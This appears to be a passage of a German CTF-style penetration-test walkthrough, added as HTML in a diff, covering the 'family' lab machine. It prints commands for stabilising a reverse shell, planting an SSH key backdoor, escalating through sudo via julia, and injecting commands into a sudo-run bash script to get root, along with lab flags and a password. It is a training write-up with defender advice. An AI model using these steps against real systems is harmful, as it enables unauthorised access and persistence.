+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf der Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 4444
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- In der Reverse Shell als dad, nach 'reset' -->
+                    <div class="prompt">dad@family:~$</div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong>
+                 1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine Bash-Shell innerhalb eines Pseudo-Terminals (PTY), um TTY-Funktionen zu ermöglichen.
+                 2. `export TERM=xterm`: Setzt die Terminal-Variable, damit Programme wie `clear` oder Editoren korrekt funktionieren.
+                 3. `Ctrl+Z`: Sendet die Netcat-Shell in den Hintergrund (auf der Angreifer-Maschine).
+                 4. `stty raw -echo`: Versetzt das lokale Terminal des Angreifers in den Raw-Modus und deaktiviert das lokale Echo.
+                 5. `fg`: Holt den Netcat-Job wieder in den Vordergrund.
+                 6. `reset` (im Originaltext erwähnt, aber nicht als Befehl gezeigt): Setzt das Terminal zurück.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standardprozedur zur Stabilisierung einer Reverse Shell, die nun eine interaktivere Nutzung erlaubt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die stabilisierte Shell für die weitere Enumeration nutzen.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dad@family:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 36
+drwxr-xr-x 5 dad  dad  4096 Oct 25 07:18 .
+drwxr-xr-x 5 root root 4096 Oct 11 16:27 ..
+lrwxrwxrwx 1 dad  dad     9 Oct  2 15:38 .bash_history -> /dev/null
+-rw-r--r-- 1 dad  dad   220 Oct  2 13:46 .bash_logout
+-rw-r--r-- 1 dad  dad  3526 Oct 24 07:35 .bashrc
+drwxr-xr-x 3 dad  dad  4096 Oct 22 09:57 .local
+-rw-r--r-- 1 dad  dad   807 Oct  2 13:46 .profile
+drwx------ 2 dad  dad  4096 Oct 23 18:01 .ssh
+-rwxr-xr-x 1 dad  dad   620 Oct 25 07:18 project
+drwxr-xr-x 2 dad  dad  4096 Nov 16 14:17 survey
+                    </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">dad@family:~$ <span class="command">cd .ssh/</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dad@family:~/.ssh$ <span class="command">ls</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dad@family:~/.ssh$ <span class="command">ls -a</span></div>
+                    <pre>
+.  ..
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis von `dad` wird aufgelistet. Das Skript `project` und das Verzeichnis `survey` sind vorhanden. Das `.ssh`-Verzeichnis ist leer.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Umgebung als `dad`. Das leere `.ssh`-Verzeichnis bietet die Möglichkeit, einen SSH-Schlüssel für einen einfacheren Zugang hinzuzufügen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen öffentlichen SSH-Schlüssel des Angreifers in die Datei `~/.ssh/authorized_keys` eintragen, um sich zukünftig passwortlos als `dad` per SSH anmelden zu können.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Prompt unklar im Original, sollte vom Angreifer sein -->
+                    <pre>
+cat /root/.ssh/id_rsa.pub
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dad@family:~/.ssh$ <span class="command">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfSQAyP3WCvqy4VJgBk8Cu9bS+ijBp7UDvcCPXNYtF7iq1GN42nEbYINA9eUxAtyQqP4ooSyRjRF+ma6c3eL2lpJp2VAEaQ9mob0KbcnEWaHy9Wp92cWG2Qt2cLveB4sthb651/2kTuntT/+GP9bhnV2lgk51VbNQEW2lPWT6sorI6cNH3uAC8bXKg75TrllYL4bY4bWXgUmKLhzb1HGl1p+bg0u4OQ8RWP9G0TIpeviqlhSvJfte10cL+XRWxeYSOFOZFNMHe2+4mHidzifaa1Kf2LKKEQi44BveEpoNXnVbv/9vqKSFvw2uPisLpKjcD/2cRLqNM5RqUoAKubrR5VigqHr61kQ0WBK6T+RsSbOpSOfgEFQAIM5spbE+4/5pQUBkCJjIU3+xJBAEMXQlYARR9UetxFb7ejLvWi4u1D8vUIbVpSJzmCqIbC8qhX+MjFm6tq5zvz9wDY8+j17KE5Kb90sl/1Qhive1BMcNBBkqvpZFm8uzK8193oAW+zxE=' > authorized_keys</span></div>
+                    <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der öffentliche SSH-Schlüssel des Angreifers (vermutlich aus `/root/.ssh/id_rsa.pub` auf der Angreifer-Maschine) wird kopiert und in die Datei `/home/dad/.ssh/authorized_keys` auf dem Zielsystem eingefügt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies richtet einen SSH-Backdoor/Login für den Benutzer `dad` ein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen, ob der SSH-Login mit dem privaten Schlüssel des Angreifers nun funktioniert.<br><strong>Empfehlung (Admin):</strong> Überwachen von Änderungen an `authorized_keys`-Dateien. Zugriff auf Home-Verzeichnisse und `.ssh`-Verzeichnisse einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh dad@192.168.2.114</span></div> <!-- IP korrigiert -->
+                    <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">(Passphrase eingegeben)</span>
+Linux family 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+[...]
+Last login: Sun Oct 23 17:51:23 2022 from fe80::d63d:7eff:fef1:3736%enp0s3
+<span class="password">dad@family:~$</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als `dad` von der Angreifer-Maschine aus wird getestet. Da der verwendete private Schlüssel `/root/.ssh/id_rsa` mit einer Passphrase geschützt ist, muss diese eingegeben werden. Der Login ist erfolgreich.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Zugang als `dad` funktioniert. Dies bietet eine stabilere Verbindung als die Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die stabilere SSH-Verbindung für die weiteren Schritte nutzen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich, da der Zugriff bereits bestand.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dad@family:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for dad on family:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User dad may run the following commands on family:
+    <span class="password">(baby) NOPASSWD: /usr/bin/julia</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `dad` wird `sudo -l` ausgeführt. Die Ausgabe zeigt, dass `dad` den Befehl `/usr/bin/julia` als Benutzer `baby` ohne Passwort ausführen darf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der nächste Schritt zur Privilegieneskalation. Durch Ausführen von `julia` als `baby` können wir Befehle oder eine Shell als dieser Benutzer erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `sudo -u baby /usr/bin/julia` ausführen und innerhalb der Julia REPL versuchen, eine Shell zu starten.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln überprüfen. Die Erlaubnis, eine interaktive Anwendung wie `julia` als anderer Benutzer auszuführen, ist oft gefährlich, da diese Anwendungen meist Möglichkeiten bieten, externe Befehle oder Shells zu starten. Nur spezifische, ungefährliche Befehle erlauben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dad@family:~$ <span class="command">sudo -u baby /usr/bin/julia</span></div>
+                    <pre>
+               _
+   _       _ _(_)_     |  Documentation: https://docs.julialang.org
+  (_)     | (_) (_)    |
+   _ _   _| |_  __ _   |  Type "?" for help, "]?" for Pkg help.
+  | | | | | | |/ _` |  |
+  | | |_| | | | (_| |  |  Version 1.5.3
+ _/ |\__'_|_|_|\__'_|  |  Debian ⛬  julia/1.5.3+dfsg-3
+|__/                   |
+
+<span class="password">julia></span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -u baby /usr/bin/julia` wird ausgeführt und startet erfolgreich die interaktive Julia REPL (Read-Eval-Print Loop) als Benutzer `baby`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wir befinden uns nun in einer Julia-Umgebung, die mit den Rechten des Benutzers `baby` läuft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine Methode finden, um aus der Julia REPL eine System-Shell zu starten.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zu `sudo`-Regeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Original -->
+                    <pre>
+google:julia run system command
+https://www.juliabloggers.com/running-shell-commands-from-julia-4/
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Notiz über die Google-Suche nach Möglichkeiten, Systembefehle aus Julia auszuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zeigt den Rechercheprozess.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Methoden anwenden.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">julia> <span class="command">run(`bash`)</span></div>
+                    <div class="prompt">boby@family:/home/dad$</div> <!-- Name wechselt zu 'boby', wahrscheinlich ein Tippfehler im Original, sollte 'baby' sein -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> In der Julia REPL wird der Befehl `run(bash)` ausgeführt. Dies startet erfolgreich eine Bash-Shell. Der Prompt zeigt nun `boby@family` (vermutlich ein Tippfehler, sollte `baby@family` sein) im Verzeichnis `/home/dad` (das Arbeitsverzeichnis von `julia` bei Start).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Eine Shell als Benutzer `baby` wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Rechte und Umgebung als `baby` untersuchen (`id`, `sudo -l`).<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+        </section>
+
+        <section id="privilege-escalation-baby-root">
+            <h2>Privilege Escalation (baby -> root)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:/home/dad$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for baby on family:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User baby may run the following commands on family:
+    <span class="password">(root) NOPASSWD: /home/baby/chocapic</span>
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `baby` wird `sudo -l` ausgeführt. Es zeigt sich, dass `baby` das Skript `/home/baby/chocapic` als `root` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Pfad zur finalen Privilegieneskalation. Das Skript `/home/baby/chocapic` muss auf Schwachstellen untersucht werden, die es erlauben, Befehle als `root` auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Skript `/home/baby/chocapic` analysieren und eine Methode finden, die Eingabevalidierung zu umgehen, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln überprüfen. Das Ausführen von benutzerdefinierten Skripten als `root` ist extrem gefährlich. Nur absolut notwendige, sicher programmierte und nicht durch den Benutzer modifizierbare Befehle erlauben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:/home/dad$ <span class="command">cd</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">ls</span></div>
+                    <pre>
+<span class="command">chocapic</span>  <span class="command">user.txt</span>
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">4fd7881d10d000c69c6f3bca0c8f7ad5</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Wechsel in das Home-Verzeichnis von `baby`. Dort befinden sich das Skript `chocapic` und die Datei `user.txt`. Der Inhalt von `user.txt` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der User-Flag wurde gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Das `chocapic`-Skript genauer analysieren.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">cp chocapic /tmp/</span></div>
+                    <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">nano /tmp/chocapic</span></div>
+                    <!-- Inhalt von chocapic (bereits oben analysiert) -->
+                    <pre>
+#! /bin/bash
+set -e
+
+while :
+do
+read -ep "baby command: " cmd
+[[ ! $cmd =~ ^[[:alnum:]]|^$ ]] && break # Bricht ab, wenn cmd NICHT mit Alnum beginnt (oder leer ist)
+done
+
+var=$(echo ${cmd%% }) 2>/dev/null # Erstes Wort in var
+[[ ${#var} -ne 1 ]] && exit 1 # Exit wenn erstes Wort nicht 1 Zeichen lang ist
+
+read -ra line <<< "$cmd"
+check=${line[1]} # Zweites Wort in check
+[[ $check =~ ^[a-z] ]] && exit 1 # Exit wenn zweites Wort mit Kleinbuchstaben beginnt
+
+# Exit wenn 'check' KEIN Builtin ist UND NICHT 1 Zeichen lang ist
+if ! type -t "$check" |grep ^b >/dev/null && [[ ! ${#check} -eq 1 ]] ; then exit 1 ; fi
+
+eval "$check" 2>/dev/null # Führe das zweite Wort aus
+bash -c "$cmd" # Führe die gesamte Eingabezeile aus
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Skript `chocapic` wird nach `/tmp` kopiert und (vermutlich) analysiert. Die Kommentare im Code-Block erklären die Logik: Es liest eine Eingabe, prüft das erste und zweite "Wort" anhand einiger Regeln und führt dann sowohl das zweite Wort (`eval "$check"`) als auch die gesamte Eingabe (`bash -c "$cmd"`) aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Schwachstelle liegt darin, dass nach den initialen Prüfungen die gesamte Eingabe `cmd` mit `bash -c` ausgeführt wird. Wenn man die Prüfungen mit einer geeigneten Eingabe passiert, kann man beliebige Befehle nach einem Semikolon anhängen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine Eingabe konstruieren, die die Prüfungen besteht und eine Root-Shell startet. Beispiel: `[ : ] ; bash`. Hier ist `[` das erste Wort (Länge 1), `:` das zweite (kein Kleinbuchstabe, ist builtin). `eval ":"` tut nichts. `bash -c '[ : ] ; bash'` führt dann `bash` aus.<br><strong>Empfehlung (Admin):</strong> Das Skript ist unsicher und sollte entfernt oder komplett überarbeitet werden. Niemals Benutzereingaben ungefiltert an `eval` oder `bash -c` übergeben, insbesondere nicht in einem Skript, das mit `sudo` ausgeführt wird.</p>
+
+            <!-- Befehle zur Exploration der Filterung -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">ls -1 /usr/bin/ | grep -v ^[a-z]</span></div>
+                    <pre>
+2to3-2.7
+X11
+[
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">.</span></div>
+                    <pre>
+bash: .: filename argument required
+.: usage: . filename [arguments]
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">!</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">echo $?</span></div>
+                    <pre>
+1
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">;</span></div>
+                    <pre>
+bash: syntax error near unexpected token `;'
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">:</span></div>
+                    <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">echo $?</span></div>
+                    <pre>
+0
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Befehle scheinen der Exploration der Filter im `chocapic`-Skript zu dienen.
+                <ul>
+                    <li>`ls ... | grep -v ^[a-z]`: Findet Befehle in `/usr/bin`, die nicht mit einem Kleinbuchstaben beginnen (z.B. `[`).</li>
+                    <li>`.`, `!`, `;`: Testen von Sonderzeichen als Befehle.</li>
+                    <li>`:`: Testen des Doppelpunkt-Befehls (ein Bash-Builtin, das nichts tut und erfolgreich zurückkehrt).</li>
+                </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Tests bestätigen, dass `[` als erstes Wort (Länge 1) und `:` als zweites Wort (Builtin, kein Kleinbuchstabe) die Prüfungen des Skripts passieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Eingabe `[ : ] ; bash` verwenden, um den `chocapic`-Exploit auszuführen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <!-- Chocapic Exploit -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">sudo ./chocapic</span></div>
+                    <pre>
+baby command: <span class="command">[ : ] ; id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+                    </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">id</span></div>
+                    <pre>
+uid=1001(baby) gid=1001(baby) groups=1001(baby)
+                    </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">sudo ./chocapic</span></div>
+                    <pre>
+baby command: <span class="command">[ : ] ; cat /root/root.txt</span>
+                    </pre> <!-- Keine Ausgabe von cat im Original -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Skript `/home/baby/chocapic` wird mit `sudo` ausgeführt.
+                1.  Eingabe: `[ : ] ; id`. Das Skript akzeptiert die Eingabe und führt `bash -c '[ : ] ; id'` aus. Die `id`-Ausgabe zeigt `uid=0(root)`.
+                2.  Ein `id`-Aufruf ohne `sudo` bestätigt, dass die Hauptshell noch als `baby` läuft.
+                3.  Eingabe: `[ : ] ; cat /root/root.txt`. Das Skript akzeptiert die Eingabe und führt `bash -c '[ : ] ; cat /root/root.txt'` aus. Es wird keine Ausgabe von `cat` angezeigt, was darauf hindeutet, dass die Datei entweder leer ist, nicht existiert oder (wahrscheinlicher) Binärdaten/verschlüsselte Daten enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit funktioniert, um Befehle als `root` auszuführen. Die Datei `root.txt` scheint nicht direkt lesbar zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine Root-Shell statt eines einzelnen Befehls starten: `[ : ] ; bash`.<br><strong>Empfehlung (Admin):</strong> Das `chocapic`-Skript und die `sudo`-Regel entfernen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">boby@family:~$ <span class="command">sudo ./chocapic</span></div>
+                    <pre>
+baby command: <span class="command">[ : ] ; bash</span>
+<span class="password">root@family:/home/baby#</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Skript wird erneut mit `sudo` ausgeführt. Die Eingabe `[ : ] ; bash` passiert die Prüfungen und führt `bash -c '[ : ] ; bash'` aus. Dies startet erfolgreich eine interaktive Shell als `root`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Root-Zugriff wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Root-Flag suchen und entschlüsseln.<br><strong>Empfehlung (Admin):</strong> Sofortige Bereinigung des Systems (Entfernen des unsicheren Skripts und der sudo-Regel).</p>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+
+            <p class="analysis"><strong>Analyse (User Flag):</strong> Der User-Flag wurde bereits als Benutzer `baby` im Verzeichnis `/home/baby` gefunden und ausgelesen.</p>
+
+            <div class="flag-container">
+                 <!-- User Flag Eintrag -->
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/baby/user.txt</div>
+                    <div class="flag-value"><span class="password">4fd7881d10d000c69c6f3bca0c8f7ad5</span></div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse (Root Flag):</strong> Die Datei `/root/root.txt` wurde identifiziert, scheint aber verschlüsselt zu sein. Weitere Untersuchung als Root ist nötig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:/home/baby# <span class="command">cd</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:~# <span class="command">file root.txt</span></div>
+                    <pre>
+root.txt: <span class="command">openssl enc'd data with salted password</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `file` bestätigt, dass `root.txt` mit OpenSSL verschlüsselte Daten enthält.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Passwort zur Entschlüsselung wird benötigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das System nach Hinweisen auf das Passwort durchsuchen. Oft sind Passwörter in Konfigurationsdateien, Skripten oder auf anderen Partitionen versteckt.<br><strong>Empfehlung (Admin):</strong> Sensible Daten sollten sicher gespeichert und verschlüsselt werden, aber der Schlüssel/das Passwort muss ebenfalls sicher verwahrt werden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:~# <span class="command">lsblk</span></div>
+                    <pre>
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0 15.3G  0 disk
+├─sda1   8:1    0 13.3G  0 part /
+├─sda2   8:2    0    1K  0 part
+├─<span class="command">sda3</span>   8:3    0    <span class="command">1G</span>  0 part
+└─sda5   8:5    0  976M  0 part [SWAP]
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:~# <span class="command">mount /dev/sda3 /mnt</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:~# <span class="command">cd /mnt/</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:/mnt# <span class="command">ls</span></div>
+                    <pre>
+<span class="command">password</span>
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">root@family:/mnt# <span class="command">file password</span></div>
+                    <pre>
+password: ASCII text
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:/mnt# <span class="command">cat password</span></div>
+                    <pre>
+<span class="password">QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma</span>
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `lsblk` zeigt eine separate 1GB-Partition (`sda3`), die nicht eingehängt ist. Diese Partition wird nach `/mnt` gemountet. Dort befindet sich eine einzelne Datei namens `password`, die das Passwort `QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma` enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Passwort für die verschlüsselte `root.txt` wurde gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieses Passwort verwenden, um `root.txt` mit OpenSSL zu entschlüsseln.<br><strong>Empfehlung (Admin):</strong> Passwörter nicht unverschlüsselt auf separaten Partitionen speichern. Sicherere Methoden zur Schlüsselverwaltung verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">root@family:/mnt# <span class="command">echo "QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma" > /root/pass</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:/mnt# <span class="command">cd</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">root@family:~# <span class="command">openssl version</span></div>
+                    <pre>
+OpenSSL 1.1.1n  15 Mar 2022
+                    </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+google: openssl 1.1.1 encryption file
+https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html
+openssl enc -aes128 -pbkdf2 -d -in file.aes128 -out file.txt
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@family:~# <span class="command">openssl enc -aes128 -pbkdf2 -d -in root.txt -out file.txt</span></div>
+                    <pre>
+enter aes-128-cbc decryption password: <span class="password">QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma</span>
+                    </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">root@family:~# <span class="command">cat file.txt</span></div>
+                    <pre>
+<span class="password">8d8ff4976efccbfc8ff7d7554b9239e5</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das gefundene Passwort wird in eine temporäre Datei gespeichert (optional). Die OpenSSL-Version wird geprüft. Basierend auf der Dokumentation wird der Befehl `openssl enc -aes128 -pbkdf2 -d -in root.txt -out file.txt` verwendet, um die Datei `root.txt` zu entschlüsseln. Das Passwort von der Partition `sda3` wird eingegeben. Die entschlüsselte Datei `file.txt` wird erstellt und ihr Inhalt, der Root-Flag, wird ausgegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Root-Flag wurde erfolgreich entschlüsselt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag dokumentieren. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Überdenken der Methode zur Speicherung des Root-Flags und des zugehörigen Passworts.</p>
+
+            <!-- Flags Section -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/baby/user.txt</div>
+                    <div class="flag-value"><span class="password">4fd7881d10d000c69c6f3bca0c8f7ad5</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">openssl enc -d ... -in /root/root.txt && cat file.txt</div>
+                    <div class="flag-value"><span class="password">8d8ff4976efccbfc8ff7d7554b9239e5</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 7. November 2022</p>
+    </footer>
+</body>
+</html> 
